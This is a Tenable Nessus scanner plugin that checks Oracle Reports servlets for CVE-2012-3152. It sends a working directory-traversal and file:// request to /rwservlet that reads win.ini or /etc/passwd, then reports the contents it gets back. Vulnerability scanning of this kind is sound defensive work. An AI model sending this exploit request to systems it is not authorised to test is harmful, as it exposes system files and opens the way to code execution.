#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73119);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/20 14:21:44 $");

  script_cve_id("CVE-2012-3152");
  script_bugtraq_id(55955);
  script_osvdb_id(86395);
  script_xref(name:"EDB-ID", value:"31253");

  script_name(english:"Oracle Reports Servlet Remote File Access");
  script_summary(english:"Tries to read a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that has a file access
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to exploit a file access vulnerability in the Oracle
Reports servlet and retrieve to contents of a file.  A remote attacker
could use this vulnerability to read or write arbitrary files on the
system, ultimately leading to remote code execution."
  );
  # http://blog.netinfiltration.com/2013/11/03/oracle-reports-cve-2012-3152-and-cve-2012-3153/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c969a07f");
  # http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1cef09be");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Oracle Forms and Reports Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:fusion_middleware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("oracle_reports_detect.nbin");
  script_require_keys("www/oracle_reports");
  script_require_ports("Services/www", 8888);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "Oracle Reports";

port = get_http_port(default:8888);

install = get_install_from_kb(
  appname:'oracle_reports',
  port:port,
  exit_on_fail:TRUE
);

vuln_script = install['dir'] + '/rwservlet';

traversal = mult_str(str:"../", nb:15);

file_list = make_list(traversal + "windows/win.ini",
                      traversal + "winnt/win.ini",
                      "c:/windows/win.ini",
                      "c:/winnt/win.ini",
                      "/etc/passwd");

exploit_request = NULL;
exploit_response = NULL;

foreach file (file_list)
{
  exploit = vuln_script + "?destype=cache&desformat=html&JOBTYPE=rwurl&URLPARAMETER=%22file:///" + file + "%22";
  res = http_send_recv3(method:"GET",
                        item:exploit,
                        port:port,
                        exit_on_fail:TRUE);

  if (
    # windows platforms
    (
      "win.ini" >< file &&
      (
       "[Mail]" >< res[2] ||
       "[fonts]" >< res[2] ||
       "; for 16-bit app support" >< res[2]
      )
    ) ||
    # *nix
    (
      "passwd" >< file &&
      res[2] =~ " root:.*:0:[01]:"
    )
  )
  {
    exploit_request = exploit;
    exploit_response = chomp(res[2]);
    break;
  }
}

if (!isnull(exploit_request))
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the vulnerability with the following' +
      '\n' + 'request :' +
      '\n' +
      '\n' + '  ' + build_url(port:port, qs:exploit_request) + '\n';

    filename = "win.ini";
    if ("passwd" >< file)  filename = "/etc/passwd";

    if (report_verbosity > 1)
    {
      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report += '\n' + 'Server response (contents of ' + filename + ') :' +
                  '\n' +
                  '\n' + exploit_response + '\n';

        security_hole(port:port, extra:report);
      }
      else
      {
        report += '\n' + 'Attached is the server response (contents of ' + filename + ').\n';

        if ('passwd' >< filename) filename = 'passwd';

        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = filename;
        attachments[0]["value"] = exploit_response;

        security_report_with_attachments(level:3, port:port, extra:report, attachments:attachments);
      }
    }
    else security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:'/'));
